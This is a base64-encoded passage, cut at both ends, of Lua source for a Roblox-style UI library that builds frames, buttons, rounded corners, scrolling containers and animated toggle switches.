JuZXIiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAib3V0bGluZSIgXTsKICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgNykKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgImlubGluZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAib3V0bGluZSIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMSwgMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0yLCAxLCAtMik7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDIyLCAyMiwgMjQpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDcpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJzY3JvbGxpbmciIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlNjcm9sbGluZ0ZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBTY3JvbGxCYXJJbWFnZUNvbG9yMyA9IHJnYig0NCwgNDQsIDQ2KTsKICAgICAgICAgICAgICAgICAgICBBY3RpdmUgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY0NhbnZhc1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWTsKICAgICAgICAgICAgICAgICAgICBTY3JvbGxCYXJUaGlja25lc3MgPSAyOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaW5saW5lIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDEsIC00MCk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDAsIDM1KTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIENhbnZhc1NpemUgPSBkaW0yKDAsIDAsIDAsIDApCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJlbGVtZW50cyIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInNjcm9sbGluZyIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMTAsIDAsIDEwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMjAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJlbGVtZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nID0gZGltKDAsIDEwKTsKICAgICAgICAgICAgICAgICAgICBTb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nQm90dG9tID0gZGltKDAsIDE1KTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImVsZW1lbnRzIiBdCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJidXR0b24iIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJvdXRsaW5lIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMiwgMCwgMzUpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDE5LCAxOSwgMjEpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVN0cm9rZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgQ29sb3IgPSByZ2IoMjMsIDIzLCAyOSk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJidXR0b24iIF07CiAgICAgICAgICAgICAgICAgICAgRW5hYmxlZCA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIEFwcGx5U3Ryb2tlTW9kZSA9IEVudW0uQXBwbHlTdHJva2VNb2RlLkJvcmRlcgogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA3KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAiSWNvbiIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiSW1hZ2VMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgSW1hZ2VDb2xvcjMgPSB0aGVtZXMucHJlc2V0LmFjY2VudDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJidXR0b24iIF07CiAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDAsIDAuNSk7CiAgICAgICAgICAgICAgICAgICAgSW1hZ2UgPSBjZmcuaWNvbjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMTAsIDAuNSwgMCk7CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMjIsIDAsIDIyKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOyBsaWJyYXJ5OmFwcGx5X3RoZW1lKGl0ZW1zWyAiSWNvbiIgXSwgImFjY2VudCIsICJJbWFnZUNvbG9yMyIpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgInNlY3Rpb25fdGl0bGUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5mb250OwogICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSBjZmcubmFtZTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgNDAsIDAsIC0xKTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWDsKICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE2OwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJidXR0b24iIF07CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMzYsIDM2LCAzNykKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBjZmcuZmFkaW5nX3RvZ2dsZSB0aGVuIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAidG9nZ2xlIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5zbWFsbDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvQnV0dG9uQ29sb3IgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMSwgMC41KTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJidXR0b24iIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMSwgLTksIDAuNSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDM2LCAwLCAxOCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoNTgsIDU4LCA2MikKICAgICAgICAgICAgICAgICAgICB9KTsgIGxpYnJhcnk6YXBwbHlfdGhlbWUoaXRlbXNbICJ0b2dnbGUiIF0sICJhY2NlbnQiLCAiQmFja2dyb3VuZENvbG9yMyIpOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInRvZ2dsZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDk5OSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgInRvZ2dsZV9vdXRsaW5lIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidG9nZ2xlIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMiwgMSwgLTIpOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyTW9kZSA9IEVudW0uQm9yZGVyTW9kZS5JbnNldDsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMSwgMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoNTAsIDUwLCA1MCkKICAgICAgICAgICAgICAgICAgICB9KTsgIGxpYnJhcnk6YXBwbHlfdGhlbWUoaXRlbXNbICJ0b2dnbGVfb3V0bGluZSIgXSwgImFjY2VudCIsICJCYWNrZ3JvdW5kQ29sb3IzIik7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidG9nZ2xlX291dGxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA5OTkpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUdyYWRpZW50IiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgQ29sb3IgPSByZ2JzZXF7cmdia2V5KDAsIHJnYigyMTEsIDIxMSwgMjExKSksIHJnYmtleSgxLCByZ2IoMjExLCAyMTEsIDIxMSkpfTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJ0b2dnbGVfb3V0bGluZSIgXQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAidG9nZ2xlX2NpcmNsZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInRvZ2dsZV9vdXRsaW5lIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDIsIDAsIDIpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDEyLCAwLCAxMik7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoODYsIDg2LCA4OCkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJ0b2dnbGVfY2lyY2xlIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgOTk5KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm91dGxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA3KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJmYWRlIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAib3V0bGluZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuODAwMDAwMDExOTIwOTI5OwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigwLCAwLCAwKQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImZhZGUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA3KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICBlbmQ7CgogICAgICAgICAgICBpZiBjZmcuZmFkaW5nX3RvZ2dsZSB0aGVuCiAgICAgICAgICAgICAgICBpdGVtc1sgImJ1dHRvbiIgXS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgICAgICAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggb3IgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBjZmcuZGVmYXVsdCA9IG5vdCBjZmcuZGVmYXVsdCAKICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLnRvZ2dsZV9zZWN0aW9uKGNmZy5kZWZhdWx0KSAKICAgICAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgZnVuY3Rpb24gY2ZnLnRvZ2dsZV9zZWN0aW9uKGJvb2wpCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgInRvZ2dsZSIgXSwge0JhY2tncm91bmRDb2xvcjMgPSBib29sIGFuZCB0aGVtZXMucHJlc2V0LmFjY2VudCBvciByZ2IoNTgsIDU4LCA2Mil9LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQpCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgInRvZ2dsZV9vdXRsaW5lIiBdLCB7QmFja2dyb3VuZENvbG9yMyA9IGJvb2wgYW5kIHRoZW1lcy5wcmVzZXQuYWNjZW50IG9yIHJnYig1MCwgNTAsIDUwKX0sIEVudW0uRWFzaW5nU3R5bGUuUXVhZCkKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAidG9nZ2xlX2NpcmNsZSIgXSwge0JhY2tncm91bmRDb2xvcjMgPSBib29sIGFuZCByZ2IoMjU1LCAyNTUsIDI1NSkgb3IgcmdiKDg2LCA4NiwgODgpLCBQb3NpdGlvbiA9IGJvb2wgYW5kIGRpbTIoMSwgLTE0LCAwLCAyKSBvciBkaW0yKDAsIDIsIDAsIDIpfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkKQogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJmYWRlIiBdLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IGJvb2wgYW5kIDEgb3IgMC44fSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkKQogICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICByZXR1cm4gc2V0bWV0YXRhYmxlKGNmZywgbGlicmFyeSkKICAgICAgICBlbmQgIAoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnRvZ2dsZShvcHRpb25zKSAKICAgICAgICAgICAgbG9jYWwgcmFuZCA9IG1hdGgucmFuZG9tKDEsIDIpIAogICAgICAgICAgICBsb2NhbCBjZmcgPSB7CiAgICAgICAgICAgICAgICBlbmFibGVkID0gb3B0aW9ucy5kZWZhdWx0IG9yIGZhbHNlLAogICAgICAgICAgICAgICAgbmFtZSA9IG9wdGlvbnMubmFtZSBvciAiVG9nZ2xlIiwKICAgICAgICAgICAgICAgIGluZm8gPSBvcHRpb25zLmluZm8gb3IgbmlsLAogICAgICAgICAgICAgICAgZmxhZyA9IG9wdGlvbnMuZmxhZyBvciBsaWJyYXJ5Om5leHRfZmxhZygpLAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB0eXBlID0gb3B0aW9ucy50eXBlIGFuZCBzdHJpbmcubG93ZXIob3B0aW9ucy50eXBlKSBvciByYW5kID09IDEgYW5kICJ0b2dnbGUiIG9yICJjaGVja2JveCI7IC0tICJ0b2dnbGUiLCAiY2hlY2tib3giCgogICAgICAgICAgICAgICAgZGVmYXVsdCA9IG9wdGlvbnMuZGVmYXVsdCBvciBmYWxzZSwKICAgICAgICAgICAgICAgIGZvbGRpbmcgPSBvcHRpb25zLmZvbGRpbmcgb3IgZmFsc2UsIAogICAgICAgICAgICAgICAgY2FsbGJhY2sgPSBvcHRpb25zLmNhbGxiYWNrIG9yIGZ1bmN0aW9uKCkgZW5kLAoKICAgICAgICAgICAgICAgIGl0ZW1zID0ge307CiAgICAgICAgICAgICAgICBzZXBlcmF0b3IgPSBvcHRpb25zLnNlcGVyYXRvciBvciBvcHRpb25zLlNlcGVyYXRvciBvciBmYWxzZTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLmRlZmF1bHQKCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbwogICAgICAgICAgICAgICAgaXRlbXNbICJ0b2dnbGUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IHNlbGYuaXRlbXNbICJlbGVtZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWTsKICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE0OwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgIm5hbWUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5zbWFsbDsKICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDI0NSwgMjQ1LCAyNDUpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBUZXh0ID0gY2ZnLm5hbWU7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJ0b2dnbGUiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlhZOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTY7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgaWYgY2ZnLmluZm8gdGhlbiAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImluZm8iIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMTMwLCAxMzAsIDEzMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFdyYXBwZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gY2ZnLmluZm87CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidG9nZ2xlIiBdOwogICAg